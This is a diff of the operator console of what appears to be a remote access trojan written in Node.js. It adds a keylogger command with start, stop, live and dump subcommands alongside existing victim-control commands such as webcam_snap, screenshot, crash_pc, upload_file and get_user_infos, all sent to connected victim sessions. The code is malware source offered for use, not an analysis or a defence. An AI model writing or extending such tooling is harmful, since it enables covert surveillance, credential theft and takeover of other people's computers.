@@ -132,7 +132,7 @@ function findSessionNumber(SS, SE){
 }
 
 function suggestions(line) {
-	const completions = 'win_help exit help speedtest sessions background get_user_infos set_state list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const completions = 'win_help exit help speedtest sessions background get_user_infos keylogger set_state list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
 	const hits = completions.filter((c) => c.startsWith(line));
 	return [hits.length ? hits : completions, line];
 }
@@ -146,7 +146,19 @@ rl.on('line', (line) => {
 		} else if (msg == "speedtest") {
 			console.log("[".bold + "+".blue + "] Speed testing...".bold);
 			sessions[currentSession].send(msg);
-		} else if (msg == "list_disks") {
+		} else if (msg.startsWith("keylogger")) {
+			if(msg.split(" ").length == 2){
+				if(msg.split(" ")[1] == "dump" || msg.split(" ")[1] == "start" || msg.split(" ")[1] == "live" || msg.split(" ")[1] == "stop"){
+				sessions[currentSession].send(msg);
+				}else{
+					console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "keylogger start/stop/live/dump");
+					rl.prompt();
+				}
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "keylogger start/stop/live/dump");
+				rl.prompt();
+			}
+		}else if (msg == "list_disks") {
 			console.log("[".bold + "+".blue + "] Listing disks !".bold);
 			sessions[currentSession].send("wmic logicaldisk get deviceid, volumename, description");
 		} else if (msg.startsWith("list_files")) {
